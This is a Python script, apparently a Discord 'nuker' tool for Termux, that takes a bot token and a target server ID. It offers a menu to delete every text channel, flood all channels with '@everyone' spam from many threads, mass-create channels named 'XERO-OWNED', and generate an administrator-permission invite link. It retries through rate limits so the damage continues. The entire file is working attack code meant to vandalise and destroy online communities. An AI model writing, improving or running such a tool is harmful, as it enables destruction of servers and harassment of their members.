"""
XERO SIMPLE - TERMUX EDITION
JUST WHAT YOU NEED - NO FILES NEEDED
"""
import json
import os
import sys
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor

# تنظيف الشاشة
os.system("clear")

print("""
\033[91m
╔══════════════════════════════════════════════════╗
║           XERO SIMPLE - TERMUX EDITION           ║
║              JUST WHAT YOU NEED                  ║
╚══════════════════════════════════════════════════╝
\033[0m
""")

# يطلب التوكن منك مباشرة
token = input("\033[91m[?] ENTER BOT TOKEN:\033[0m ").strip()

if not token:
    print("\033[91m[!] Token is required!\033[0m")
    sys.exit(1)

class XeroSimple:
    def __init__(self, guild_id, token):
        self.guild_id = guild_id
        self.token = token
        self.spamming = False
        self.spam_count = 0
        self.spam_thread = None
        self.executor = ThreadPoolExecutor(max_workers=200)
        self.headers = {"Authorization": f"Bot {self.token}"}

    def get_all_channels_sync(self):
        try:
            r = requests.get(
                f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                headers=self.headers,
                timeout=5
            )
            if r.status_code == 200:
                channels = r.json()
                return [c for c in channels if c['type'] == 0]
            elif r.status_code == 403:
                print(f"\033[91m[!] Bot doesn't have access to guild\033[0m")
            elif r.status_code == 404:
                print(f"\033[91m[!] Guild not found\033[0m")
        except:
            print(f"\033[91m[!] Connection error\033[0m")
        return []

    # ==================== حذف كل الرومات ====================
    def delete_all_channels_sync(self):
        print("\n\033[91m[💀] DELETING ALL CHANNELS...\033[0m\n")
        
        channels = self.get_all_channels_sync()
        if not channels:
            print("\033[91m[!] NO CHANNELS FOUND!\033[0m")
            return
        
        print(f"\033[91m[!] Found {len(channels)} channels\n\033[0m")
        
        def delete_channel(channel_id):
            try:
                r = requests.delete(
                    f"https://discord.com/api/v10/channels/{channel_id}",
                    headers=self.headers,
                    timeout=3
                )
                if r.status_code == 200:
                    print(f"\033[91m[💀] DELETED: {channel_id}\033[0m")
                    return True
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    time.sleep(retry)
                    return delete_channel(channel_id)
            except:
                pass
            return False
        
        futures = [self.executor.submit(delete_channel, c['id']) for c in channels]
        deleted = sum(1 for f in futures if f.result())
        print(f"\n\033[91m[💀] DELETED {deleted}/{len(channels)}!\033[0m\n")

    # ==================== سبام ====================
    def spam_worker(self, channel_id, message):
        session = requests.Session()
        session.headers.update(self.headers)
        last_print = time.time()
        
        while self.spamming:
            try:
                r = session.post(
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    json={"content": message},
                    timeout=1
                )
                if r.status_code == 200:
                    self.spam_count += 1
                    if time.time() - last_print >= 0.1:
                        sys.stdout.write(f"\r\033[96m[🔥] TOTAL SENT: {self.spam_count}\033[0m")
                        sys.stdout.flush()
                        last_print = time.time()
                elif r.status_code == 429:
                    time.sleep(r.json().get('retry_after', 0.1))
            except:
                pass

    def spam_all_channels_thread(self, message):
        print(f"\n\033[96m[🔥] SPAMMING: {message}\033[0m")
        print("\033[96m[!] PRESS ENTER TO STOP\n\033[0m")
        
        channels = self.get_all_channels_sync()
        if not channels:
            print("\033[91m[!] NO CHANNELS!\033[0m")
            return
        
        futures = []
        for channel in channels:
            for _ in range(5):
                futures.append(self.executor.submit(self.spam_worker, channel['id'], message))
        
        for f in futures:
            try:
                f.result(timeout=0.1)
            except:
                pass

    def start_spam(self, message):
        if self.spamming:
            return
        self.spamming = True
        self.spam_count = 0
        self.spam_thread = threading.Thread(target=self.spam_all_channels_thread, args=(message,))
        self.spam_thread.daemon = True
        self.spam_thread.start()

    def stop_spam(self):
        self.spamming = False
        if self.spam_thread:
            self.spam_thread.join(timeout=1)
        print(f"\n\n\033[91m[!] STOPPED. TOTAL: {self.spam_count}\033[0m")

    # ==================== إنشاء رومات ====================
    def create_channels_sync(self, channel_name, amount):
        print(f"\n\033[92m[🏗️] CREATING {amount} CHANNELS...\033[0m\n")
        
        created = 0
        lock = threading.Lock()
        
        def create_channel(name):
            nonlocal created
            try:
                r = requests.post(
                    f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                    headers=self.headers,
                    json={"name": name, "type": 0},
                    timeout=3
                )
                if r.status_code == 201:
                    with lock:
                        created += 1
                        print(f"\033[92m[+] {created}/{amount}: {name}\033[0m")
                    return True
                elif r.status_code == 429:
                    time.sleep(r.json().get('retry_after', 1))
                    return create_channel(name)
            except:
                pass
            return False
        
        names = [f"{channel_name}-{i+1}" if amount > 1 else channel_name for i in range(amount)]
        futures = [self.executor.submit(create_channel, name) for name in names]
        for f in futures:
            try:
                f.result(timeout=10)
            except:
                pass
        
        print(f"\n\033[92m[🏗️] DONE! Created: {created}/{amount}\033[0m\n")

    # ==================== رابط الدعوة ====================
    def get_invite_link(self):
        try:
            r = requests.get("https://discord.com/api/v10/oauth2/applications/@me", headers=self.headers, timeout=5)
            if r.status_code == 200:
                client_id = r.json()['id']
                return f"https://discord.com/api/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot"
        except:
            pass
        return None

    # ==================== القائمة ====================
    def menu(self):
        while True:
            os.system("clear")
            print(f"""
\033[91m
╔══════════════════════════════════════════════════╗
║        XERO SIMPLE - TERMUX EDITION              ║
║        TARGET: {self.guild_id}                            
╠══════════════════════════════════════════════════╣
║                                                  ║
║  [1] 💀 DELETE ALL CHANNELS                      ║
║  [2] 🔥 SPAM ALL CHANNELS                        ║
║  [3] 🏗️ CREATE CHANNELS                          ║
║  [4] 🔗 SHOW INVITE LINK                         ║
║  [5] 🔄 CHANGE TARGET                            ║
║  [6] 🚪 EXIT                                     ║
║                                                  ║
╚══════════════════════════════════════════════════╝
\033[0m
            """)
            
            choice = input("\033[91m[XERO]\033[0m > ")

            if choice == "1":
                confirm = input("\033[91m[!] ARE YOU SURE? (yes/no): \033[0m")
                if confirm.lower() == 'yes':
                    self.delete_all_channels_sync()
                input("\n[PRESS ENTER]")
                
            elif choice == "2":
                message = input("\033[96m[?] MESSAGE:\033[0m ")
                if not message:
                    message = "@everyone XERO WAS HERE 🔥"
                self.start_spam(message)
                input()
                self.stop_spam()
                
            elif choice == "3":
                name = input("\033[92m[?] NAME:\033[0m ") or "XERO-OWNED"
                try:
                    amount = int(input("\033[92m[?] HOW MANY:\033[0m "))
                except:
                    amount = 50
                self.create_channels_sync(name, amount)
                input("\n[PRESS ENTER]")
                
            elif choice == "4":
                invite = self.get_invite_link()
                if invite:
                    print(f"\n\033[96m[🔗] {invite}\033[0m")
                else:
                    print("\033[91m[!] Failed!\033[0m")
                input("\n[PRESS ENTER]")
                
            elif choice == "5":
                return "change"
                
            elif choice == "6":
                print("\033[91m[!] BYE!\033[0m")
                self.executor.shutdown(wait=False)
                return "exit"

# ==================== التشغيل ====================
os.system("clear")

# فحص التوكن
test_headers = {"Authorization": f"Bot {token}"}
try:
    r = requests.get("https://discord.com/api/v10/users/@me", headers=test_headers, timeout=5)
    if r.status_code == 200:
        bot_info = r.json()
        print(f"\033[92m[✓] LOGGED IN AS: {bot_info['username']}\033[0m\n")
    else:
        print(f"\033[91m[!] INVALID TOKEN!\033[0m")
        sys.exit(1)
except:
    print(f"\033[91m[!] NO INTERNET!\033[0m")
    sys.exit(1)

while True:
    guild_id = input("\033[91m[?] GUILD ID (or exit):\033[0m ").strip()
    if guild_id.lower() == 'exit':
        sys.exit(0)
    if not guild_id.isdigit():
        print("\033[91m[!] INVALID ID!\033[0m")
        continue
    
    xero = XeroSimple(guild_id, token)
    result = xero.menu()
    if result == "exit":
        sys.exit(0)
